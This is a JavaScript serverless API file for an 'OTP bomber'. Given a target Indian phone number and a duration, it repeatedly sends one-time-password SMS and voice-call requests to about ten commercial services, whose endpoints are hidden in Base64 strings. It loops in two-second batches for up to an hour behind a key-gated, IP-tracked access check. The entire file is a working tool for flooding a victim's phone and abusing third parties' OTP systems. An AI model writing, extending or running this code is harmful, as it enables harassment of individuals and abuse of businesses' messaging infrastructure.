// api/bomber.js
const fs = require('fs');
const path = require('path');

// Load keys from keys.json
const keysPath = path.join(process.cwd(), 'keys.json');
let keys = {};

try {
  if (fs.existsSync(keysPath)) {
    keys = JSON.parse(fs.readFileSync(keysPath, 'utf8'));
  }
} catch (error) {
  console.error('Error loading keys.json:', error);
}

// IP tracking storage
let ipUsage = new Map();
let privateKeyUsage = new Map();

// Clean up old IP records every hour
setInterval(() => {
  const now = Date.now();
  for (let [ip, data] of ipUsage.entries()) {
    if (now - data.firstSeen > 24 * 60 * 60 * 1000) {
      ipUsage.delete(ip);
    }
  }
  for (let [key, data] of privateKeyUsage.entries()) {
    if (now - data.firstUsed > 24 * 60 * 60 * 1000) {
      privateKeyUsage.delete(key);
    }
  }
}, 60 * 60 * 1000);

// Encoded service configurations (Base64)
const encodedServices = [
  "VGF0YSBDYXBpdGFsfFZPSUNFIENBTEx8aHR0cHM6Ly9tb2JhcHAudGF0YWNhcGl0YWwuY29tL2FwaS92MS9vdHAvc2VuZHxQT1NUfC17Im1vYmlsZU51bWJlciI6IjkxPFBIT05FPiJ9",
  "QXBvbGxvIDI0N3xWT0lDRSBDQUxMfGh0dHBzOi8vYXBpZ2F0ZXdheS5hcG9sbG8yNDcuaW4vdm9pY2Uvb3RwfFBPU1R8LXsicGhvbmUiOiI5MTxQSE9ORT4ifQ==",
  "U3dpZ2d5fFZPSUNFIENBTEx8aHR0cHM6Ly9wcm9maWxlLnN3aWdneS5jb20vYXBpL3YxL290cC9zZW5kfFBPU1R8LXsibW9iaWxlIjoiOTF8UEhPTkU-fCJ9",
  "MW1nfFZPSUNFIENBTEx8aHR0cHM6Ly93d3cuMW1nLmNvbS9vdHAvc2VuZHxQT1NUfC17InBob25lIjoiOTF8UEhPTkU-fCJ9",
  "Qmlrcm95fFNNU3xodHRwczovL2Jpa3JveS5jb20vYXBpL3YxL290cC9zZW5kfFBPU1R8LXsibW9iaWxlIjoiOTF8UEhPTkU-fCJ9",
  "ZUNvdXJpZXJ8U01TfGh0dHBzOi8vYmFja29mZmljZS5lY291cmllci5jb20uYmQvYXBpL290cHxQT1NUfC17InBob25lX251bWJlciI6IjkxfFBIT05FPiJ9",
  "U2hpa2hvfFNNU3xodHRwczovL2FwaS5zaGlraG8uY29tL2F1dGgvb3RwL3NlbmR8UE9TVHwteyJwaG9uZSI6IjkxfFBIT05FPiJ9",
  "RW9uIEJhemFyfFNNU3xodHRwczovL2FwcC5lb25iYXphci5jb20vYXBpL3YxL290cHxQT1NUfC17Im1vYmlsZSI6IjkxfFBIT05FPiJ9",
  "U3dhcCBCRHxTTVN8aHR0cHM6Ly9hcGkuc3dhcC5jb20uYmQvYXBpL290cC9zZW5kfFBPU1R8LXsicGhvbmUiOiI5MXxQSE9ORT4ifQ==",
  "RnVuZGVzaHxTTVN8aHR0cHM6Ly9mdW5kZXNoLmNvbS5iZC9hcGkvb3RwfFBPU1R8LXsibW9iaWxlIjoiOTF8UEhPTkU-fCJ9"
];

// Decode services
function decodeService(encoded) {
  const decoded = Buffer.from(encoded, 'base64').toString('utf-8');
  const [name, type, url, method, bodyTemplate] = decoded.split('|');
  
  return {
    name,
    type,
    url,
    method,
    body: (phone) => bodyTemplate.replace(/<PHONE>/g, phone)
  };
}

const services = encodedServices.map(decodeService);

// Get client IP
function getClientIP(req) {
  return req.headers['x-forwarded-for']?.split(',')[0] || 
         req.headers['x-real-ip'] || 
         req.connection.remoteAddress || 
         'unknown';
}

// Validate IP limits and private keys
function validateAccess(key, ip) {
  const now = Date.now();
  
  // Check if key exists
  const keyConfig = keys.validKeys?.find(k => k.key === key);
  if (!keyConfig) {
    return { valid: false, error: "Invalid API key" };
  }
  
  // Check if key is private and already used
  if (keyConfig.private) {
    const existingUsage = privateKeyUsage.get(key);
    if (existingUsage && existingUsage.ip !== ip) {
      return { 
        valid: false, 
        error: "Private key already in use by another IP" 
      };
    }
    
    // Record private key usage
    if (!existingUsage) {
      privateKeyUsage.set(key, {
        ip: ip,
        firstUsed: now,
        lastUsed: now
      });
    } else {
      existingUsage.lastUsed = now;
    }
  }
  
  // Check IP limits
  const ipData = ipUsage.get(ip) || { 
    firstSeen: now, 
    lastSeen: now, 
    requestCount: 0,
    keysUsed: new Set() 
  };
  
  // Update IP data
  ipData.lastSeen = now;
  ipData.requestCount++;
  ipData.keysUsed.add(key);
  
  // Check if IP has used too many keys
  const maxKeysPerIP = keyConfig.maxIPs || keys.defaultMaxIPs || 3;
  if (ipData.keysUsed.size > maxKeysPerIP) {
    return { 
      valid: false, 
      error: `IP limit exceeded. Maximum ${maxKeysPerIP} keys per IP` 
    };
  }
  
  ipUsage.set(ip, ipData);
  
  return { valid: true, keyConfig };
}

// Format phone number to 91XXXXXXXXXX
function formatPhoneNumber(phone) {
  // Remove any non-digit characters
  const cleaned = phone.toString().replace(/\D/g, '');
  
  // If 10 digits, add 91 prefix
  if (cleaned.length === 10 && /^[6-9]/.test(cleaned)) {
    return '91' + cleaned;
  }
  
  // If already 12 digits with 91 prefix
  if (cleaned.length === 12 && cleaned.startsWith('91') && /^91[6-9]/.test(cleaned)) {
    return cleaned;
  }
  
  return null;
}

// Obfuscated request maker
async function makeRequest(serviceConfig, phone, batchId, reqId) {
  try {
    const response = await fetch(serviceConfig.url, {
      method: serviceConfig.method,
      headers: {
        "Content-Type": "application/json",
        "User-Agent": "Mozilla/5.0 (Linux; Android 13; Mobile) AppleWebKit/537.36"
      },
      body: serviceConfig.body(phone)
    });

    const statusCode = response.status;
    const isSuccess = statusCode >= 200 && statusCode < 300;

    return {
      batch: batchId,
      index: reqId,
      service: serviceConfig.name,
      category: serviceConfig.type,
      result: isSuccess ? "SUCCESS" : "FAILED",
      status: statusCode
    };

  } catch (error) {
    return {
      batch: batchId,
      index: reqId,
      service: serviceConfig.name,
      category: serviceConfig.type,
      result: "FAILED",
      status: 0,
      error: error.message
    };
  }
}

// Calculate end time
function getEndTime(minutes) {
  const end = new Date();
  end.setMinutes(end.getMinutes() + minutes);
  return end.toLocaleString('en-US', { 
    year: 'numeric', 
    month: '2-digit', 
    day: '2-digit',
    hour: '2-digit',
    minute: '2-digit',
    second: '2-digit',
    hour12: false 
  }).replace(/(\d+)\/(\d+)\/(\d+)/, '$3-$1-$2');
}

export default async function handler(req, res) {
  // Set CORS headers for cross-origin requests
  res.setHeader('Access-Control-Allow-Credentials', 'true');
  res.setHeader('Access-Control-Allow-Origin', '*');
  res.setHeader('Access-Control-Allow-Methods', 'GET, POST, OPTIONS');
  res.setHeader('Access-Control-Allow-Headers', 'Content-Type, Authorization');

  if (req.method === 'OPTIONS') {
    return res.status(200).end();
  }

  // Support both GET and POST for compatibility
  let key, num, duration;
  
  if (req.method === 'GET') {
    ({ key, num, duration = 10 } = req.query);
  } else if (req.method === 'POST') {
    const body = typeof req.body === 'string' ? JSON.parse(req.body) : req.body;
    ({ key, num, duration = 10 } = body);
  } else {
    return res.status(405).json({ error: 'Method not allowed' });
  }

  const clientIP = getClientIP(req);

  // Validate API key and access
  const accessCheck = validateAccess(key, clientIP);
  if (!accessCheck.valid) {
    return res.status(401).json({ 
      success: false,
      error: "Access denied",
      message: accessCheck.error
    });
  }

  // Format and validate phone number
  const formattedPhone = formatPhoneNumber(num);
  if (!formattedPhone) {
    return res.status(400).json({ 
      success: false,
      error: "Invalid phone number",
      message: "Phone number must be 10-digit Indian number"
    });
  }

  // Validate duration
  const durationNum = parseInt(duration);
  if (isNaN(durationNum) || durationNum < 1 || durationNum > 60) {
    return res.status(400).json({ 
      success: false,
      error: "Invalid duration",
      message: "Duration must be between 1 and 60 minutes"
    });
  }

  // Set response headers based on request type
  const acceptHeader = req.headers.accept || '';
  const wantsJson = acceptHeader.includes('application/json') || req.query.format === 'json';

  if (wantsJson) {
    res.setHeader('Content-Type', 'application/json');
    
    // For JSON requests, return immediate response and process in background
    res.status(200).json({
      success: true,
      message: "OTP bombing started",
      data: {
        target: formattedPhone,
        duration: durationNum,
        ip: clientIP,
        private: accessCheck.keyConfig.private || false
      }
    });

    // Process bombing in background for JSON requests
    processBombing(formattedPhone, durationNum, clientIP, accessCheck.keyConfig);
    return;
  }

  // For regular requests, stream the response
  res.setHeader('Content-Type', 'text/plain; charset=utf-8');
  res.setHeader('Transfer-Encoding', 'chunked');

  await processBombingStream(res, formattedPhone, durationNum, clientIP, accessCheck.keyConfig);
}

// Process bombing with streaming response
async function processBombingStream(res, phone, duration, clientIP, keyConfig) {
  const startTime = new Date();
  const endTime = getEndTime(duration);

  // Send initial response
  res.write(`🚀 ULTIMATE OTP BOMBER STARTED\n`);
  res.write(`📞 Target: ${phone}\n`);
  res.write(`⏰ Duration: ${duration} minutes\n`);
  res.write(`🔁 Running until: ${endTime}\n`);
  res.write(`🌐 Your IP: ${clientIP}\n`);
  if (keyConfig.private) {
    res.write(`🔐 Private Key: LOCKED TO YOUR IP\n`);
  }
  res.write(`==========================================\n\n`);

  let batchCount = 0;
  const batchSize = services.length;
  const startTimestamp = Date.now();
  const endTimestamp = startTimestamp + (duration * 60 * 1000);

  // Main bombing loop
  while (Date.now() < endTimestamp) {
    batchCount++;
    res.write(`🎯 BATCH #${batchCount} STARTED\n`);

    const promises = services.map((service, index) => 
      makeRequest(service, phone, batchCount, index + 1)
    );

    try {
      const results = await Promise.all(promises);

      // Send results to client
      for (const result of results) {
        const statusIcon = result.result === "SUCCESS" ? "✅" : "❌";
        res.write(`   🔄 [${result.index}/${batchSize}] ${result.category} - ${result.service}\n`);
        res.write(`     ${statusIcon} ${result.result} - Code: ${result.status}\n`);
        
        // Small delay between requests
        await new Promise(resolve => setTimeout(resolve, 100));
      }

      res.write(`\n🎯 BATCH #${batchCount} COMPLETED\n`);
      res.write(`==========================================\n\n`);

    } catch (error) {
      res.write(`❌ ERROR in batch ${batchCount}: ${error.message}\n`);
    }

    // Check if time is up
    if (Date.now() >= endTimestamp) {
      break;
    }

    // Wait before next batch
    await new Promise(resolve => setTimeout(resolve, 2000));
  }

  res.write(`\n✅ BOMBING COMPLETED\n`);
  res.write(`📊 Total batches: ${batchCount}\n`);
  res.write(`🌐 Your IP: ${clientIP}\n`);
  res.write(`⏰ Finished at: ${new Date().toLocaleString()}\n`);

  res.end();
}

// Process bombing in background (for JSON responses)
async function processBombing(phone, duration, clientIP, keyConfig) {
  const startTimestamp = Date.now();
  const endTimestamp = startTimestamp + (duration * 60 * 1000);
  let batchCount = 0;

  while (Date.now() < endTimestamp) {
    batchCount++;
    
    const promises = services.map((service, index) => 
      makeRequest(service, phone, batchCount, index + 1)
    );

    try {
      await Promise.all(promises);
    } catch (error) {
      console.error(`Error in batch ${batchCount}:`, error);
    }

    if (Date.now() >= endTimestamp) break;
    await new Promise(resolve => setTimeout(resolve, 2000));
  }

  console.log(`Bombing completed for ${phone}: ${batchCount} batches`);
}
